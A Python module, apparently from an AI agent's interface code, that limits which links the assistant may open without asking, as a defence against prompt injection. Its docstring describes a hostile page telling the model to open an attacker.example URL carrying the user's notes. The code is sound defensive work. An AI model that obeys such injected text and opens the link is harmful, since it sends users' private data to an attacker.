"""Which links the assistant may open without asking (tilt_ui-eevz.10).

Prompt-injection defence: a hostile page or caption can tell the model to
open "https://attacker.example/?d=<your notes>". Opening a link sends data out
and needs no approval, so the agent may only open links that already appeared
in the user's messages or in earlier tool results (search results, links on
pages it read, its own earlier fetches). A link the model composed itself is
not in that set and goes to the user as an approval card instead.
"""

import json
import re
from typing import Any, Iterable
from urllib.parse import urlsplit

_URL = re.compile(r"""https?://[^\s"'<>\\`{}|^]+""", re.I)
_BARE = re.compile(r"""(?<![\w@/.-])(?:www\.)?[a-z0-9-]+(?:\.[a-z0-9-]+)+\.?[a-z]{2,}/[^\s"'<>\\`{}|^]*""", re.I)
_TRAILING = ".,;:!?)]}>"


def link_key(url: str) -> str | None:
    """Comparable form: host without www, path without trailing slash, query; scheme and #fragment ignored."""
    u = (url or "").strip().rstrip(_TRAILING)
    if not u:
        return None
    try:
        parts = urlsplit(u if "://" in u else f"https://{u}")
        host = (parts.hostname or "").lower()
    except ValueError:
        return None
    if not host:
        return None
    host = host.removeprefix("www.")
    path = parts.path.rstrip("/")
    return f"{host}{path}" + (f"?{parts.query}" if parts.query else "")


def urls_in(text: str) -> set[str]:
    keys = set()
    for m in list(_URL.finditer(text)) + list(_BARE.finditer(text)):
        k = link_key(m.group(0))
        if k:
            keys.add(k)
    return keys


def _text(content: Any) -> str:
    if isinstance(content, str):
        return content
    try:
        return json.dumps(content, default=str)
    except (TypeError, ValueError):
        return str(content)


def known_links(messages: Iterable[Any]) -> set[str]:
    """Links from the user's messages and from tool results; never from the model's own words or tool calls."""
    from pydantic_ai.messages import ModelRequest, ToolReturnPart, UserPromptPart

    keys: set[str] = set()
    for message in messages or []:
        if not isinstance(message, ModelRequest):
            continue
        for part in message.parts:
            if isinstance(part, UserPromptPart):
                content = part.content
                if isinstance(content, (list, tuple)):
                    content = " ".join(c for c in content if isinstance(c, str))
                keys |= urls_in(_text(content))
            elif isinstance(part, ToolReturnPart):
                keys |= urls_in(_text(part.content))
    return keys


def is_known(url: str, messages: Iterable[Any]) -> bool:
    k = link_key(url)
    return bool(k) and k in known_links(messages)
